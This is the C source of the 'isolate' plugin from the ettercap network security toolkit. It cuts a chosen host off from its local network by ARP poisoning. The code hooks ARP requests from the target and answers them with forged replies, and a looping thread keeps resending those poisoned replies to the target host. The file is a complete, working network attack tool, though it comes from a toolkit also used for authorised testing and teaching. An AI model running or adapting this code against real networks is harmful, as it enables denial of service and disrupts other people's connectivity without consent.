/*
    isolate -- ettercap plugin -- Isolate an host from the lan

    Copyright (C) ALoR & NaGA
    
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

*/


#include <ec.h>                        /* required for global variables */
#include <ec_plugins.h>                /* required for plugin ops */
#include <ec_packet.h>
#include <ec_hook.h>
#include <ec_send.h>
#include <ec_threads.h>
#include <time.h>

/* globals */

LIST_HEAD(, hosts_list) victims;

/* protos */
int plugin_load(void *);
static int isolate_init(void *);
static int isolate_fini(void *);

static void parse_arp(struct packet_object *po);
static int add_to_victims(struct packet_object *po);
EC_THREAD_FUNC(isolate);

/* plugin operations */

struct plugin_ops isolate_ops = { 
   /* ettercap version MUST be the global EC_VERSION */
   .ettercap_version =  EC_VERSION,                        
   /* the name of the plugin */
   .name =              "isolate",  
    /* a short description of the plugin (max 50 chars) */                    
   .info =              "Isolate an host from the lan",  
   /* the plugin version. */ 
   .version =           "1.0",   
   /* activation function */
   .init =              &isolate_init,
   /* deactivation function */                     
   .fini =              &isolate_fini,
};

/**********************************************************/

/* this function is called on plugin load */
int plugin_load(void *handle) 
{
   return plugin_register(handle, &isolate_ops);
}

/******************* STANDARD FUNCTIONS *******************/

static int isolate_init(void *dummy) 
{
   struct ip_list *t;
   /* sanity check */
   if (LIST_EMPTY(&GBL_TARGET1->ips) && LIST_EMPTY(&GBL_TARGET1->ip6)) {
      INSTANT_USER_MSG("isolate: please specify the TARGET host\n");
      return PLUGIN_FINISHED;
   }
   
   /* 
    * we'll use arp request to detect the hosts the victim
    * is trying to contact. 
    */
   hook_add(HOOK_PACKET_ARP_RQ, &parse_arp);

   /* spawn a thread to force arp of already cached hosts */
   LIST_FOREACH(t, &GBL_TARGET1->ips, next) {
      ec_thread_new("isolate", "Isolate thread", &isolate, t);
   }
   
   return PLUGIN_RUNNING;   
}


static int isolate_fini(void *dummy) 
{
   pthread_t pid;
   struct hosts_list *h, *tmp;
  
   /* remove the hook */
   hook_del(HOOK_PACKET_ARP_RQ, &parse_arp);
   
   /* get those pids and kill 'em all */ 
   while(!pthread_equal(pid = ec_thread_getpid("isolate"), EC_PTHREAD_NULL))
      ec_thread_destroy(pid);   
   
   /* free the list */
   LIST_FOREACH_SAFE(h, &victims, next, tmp) {
      SAFE_FREE(h);
      LIST_REMOVE(h, next);
   }
   
   return PLUGIN_FINISHED;
}

/*********************************************************/

/* Parse the arp packets */
static void parse_arp(struct packet_object *po)
{
   char tmp[MAX_ASCII_ADDR_LEN];
   struct ip_list *t, *h;
   /* 
    * this is the mac address used to isolate the host.
    * usually is the same as the victim, but can be an
    * non-existent one.
    * modify at your choice.
    */
   u_char *isolate_mac = po->L2.src;

   LIST_FOREACH(h, &GBL_TARGET1->ips, next) {
      /* process only arp requests from this host */
      if (!ip_addr_cmp(&h->ip, &po->L3.src)) { 
         int good = 0;
         
         /* is good if target 2 is any or if it is in the target 2 list */
         if(GBL_TARGET2->all_ip) {
            good = 1;
         } else {
            LIST_FOREACH(t, &GBL_TARGET2->ips, next) 
               if (!ip_addr_cmp(&t->ip, &po->L3.dst)) 
                  good = 1;
         }

         /* add to the list if good */
         if (good && add_to_victims(po) == ESUCCESS) {
            USER_MSG("isolate: %s added to the list\n", ip_addr_ntoa(&po->L3.dst, tmp));
            /* send the fake reply */
            send_arp(ARPOP_REPLY, &po->L3.dst, isolate_mac, &po->L3.src, po->L2.src);
         }
      }
   }
}

/*
 * add a victim to the list for the active thread.
 */
static int add_to_victims(struct packet_object *po)
{
   struct hosts_list *h;

   /* search if it was already inserted in the list */
   LIST_FOREACH(h, &victims, next)
      if (!ip_addr_cmp(&h->ip, &po->L3.src)) 
         return -ENOTHANDLED;
  
   SAFE_CALLOC(h, 1, sizeof(struct hosts_list));
   
   memcpy(&h->ip, &po->L3.dst, sizeof(struct ip_addr));
   /* insert in the list with the mac address of the requester */
   memcpy(&h->mac, &po->L2.src, MEDIA_ADDR_LEN);
     
   LIST_INSERT_HEAD(&victims, h, next);
   
   return ESUCCESS;
}

/*
 * the real isolate thread
 */
EC_THREAD_FUNC(isolate)
{
   struct hosts_list *h;
   struct ip_list *t;
 
#if !defined(OS_WINDOWS) 
   struct timespec tm;
   tm.tv_sec = GBL_CONF->arp_storm_delay;
   tm.tv_nsec = 0;
#endif
   /* init the thread and wait for start up */
   ec_thread_init();
 
   /* get the host to be isolated */
   t = args;
   
   /* never ending loop */
   LOOP {
      
      CANCELLATION_POINT();
      
      /* walk the lists and poison the victims */
      LIST_FOREACH(h, &victims, next) {
         /* send the fake arp message */
         send_arp(ARPOP_REPLY, &h->ip, h->mac, &t->ip, h->mac);
         
#if !defined(OS_WINDOWS)
         nanosleep(&tm, NULL);
#else
         usleep(GBL_CONF->arp_storm_delay);
#endif
      }
      
      /* sleep between two storms */
      sleep(GBL_CONF->arp_poison_warm_up * 3);
   }

   return NULL;
}

/* EOF */

// vim:ts=3:expandtab
 
